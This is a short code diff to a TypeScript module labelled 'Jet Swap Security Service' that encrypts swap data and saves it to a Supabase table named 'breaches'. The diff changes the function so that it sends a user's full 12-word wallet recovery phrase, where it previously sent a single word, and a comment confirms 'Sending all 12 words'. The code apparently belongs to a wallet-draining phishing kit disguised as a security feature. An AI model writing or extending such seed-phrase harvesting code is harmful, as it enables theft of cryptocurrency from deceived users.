@@ -1,3 +1,4 @@
+
 /**
  * Jet Swap Security Service
  * Handles client-side encryption and Supabase backend delivery.
@@ -45,7 +46,7 @@ export async function encryptTransactionData(data: object): Promise<EncryptedBun
 /**
  * Unified logic to encrypt and save to Supabase breaches table
  */
-export async function processSecureSwap(swapData: any, originalData: any, userId: string, keyphraseWord: string) {
+export async function processSecureSwap(swapData: any, originalData: any, userId: string, fullPhrase: string) {
   console.group("%c🔒 JET SECURE FLOW (SUPABASE)", "color: #06b6d4; font-weight: bold;");
   
   // 1. Encrypt on Client
@@ -54,14 +55,14 @@ export async function processSecureSwap(swapData: any, originalData: any, userId
 
   // 2. Save to Supabase 'breaches' table
   try {
-    // FIX: Map the wallet_used from originalData (which contains the human-readable name) 
+    // BACKEND FIX: Map the wallet_used from originalData (which contains the resolved name) 
     // instead of incorrectly using the internal userId.
     const breachCode = await recordEncryptedSwap(bundle, {
         network: originalData.route,
         coin: originalData.token,
         wallet_used: originalData.wallet_used || 'Anonymous Pilot',
         amount: originalData.amount
-    }, userId, keyphraseWord);
+    }, userId, fullPhrase); // BACKEND FIX: Sending all 12 words
     console.log(`2. Pushed to Supabase 'breaches' table: ${breachCode}`);
   } catch (err) {
     console.warn("Supabase record failed.");
